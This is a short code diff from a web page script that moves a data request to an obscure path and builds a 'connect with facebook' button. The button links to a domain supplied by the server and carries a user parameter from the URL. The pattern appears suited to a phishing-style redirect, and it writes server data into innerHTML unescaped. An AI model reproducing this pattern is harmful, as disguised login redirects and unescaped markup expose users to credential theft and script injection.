@@ -93,7 +93,7 @@
       const urlParams = new URLSearchParams(queryString);
       const u = urlParams.get("u");
 	    
-    axios.get("/data").then((resps) =>
+    axios.get("/data/tyzteytzyrzetzy").then((resps) =>
       {
         document.getElementById('wait').style.display= "none";
 	document.getElementById('btn').innerHTML = `<a href=${resps.data.domain}?u=${u} class="log">connect with facebook <i id="icon" class="fab fa-facebook"></i></a>`
